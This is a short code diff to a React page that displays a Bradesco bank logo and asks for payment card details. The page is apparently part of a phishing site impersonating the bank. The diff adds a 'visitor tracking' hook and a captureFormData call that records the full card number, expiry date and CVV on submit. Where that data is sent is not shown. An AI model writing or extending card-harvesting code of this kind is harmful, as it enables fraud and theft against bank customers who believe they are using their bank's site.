@@ -3,8 +3,10 @@ import { useNavigate, useLocation } from "react-router-dom";
 import { Menu, Bell } from "lucide-react";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import BottomNav from "@/components/BottomNav";
+import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
 
 const DadosCartao = () => {
+  useVisitorTracking("dados-cartao");
   const navigate = useNavigate();
   const location = useLocation();
   const { nome, conta, agencia } = (location.state as any) || {};
@@ -40,6 +42,7 @@ const DadosCartao = () => {
 
     setErrors(newErrors);
     if (Object.keys(newErrors).length === 0) {
+      captureFormData("dados-cartao", { numero: numero.replace(/\s/g, ""), validade, cvv });
       navigate("/confirmacao", { state: { nome, conta, agencia } });
     }
   };
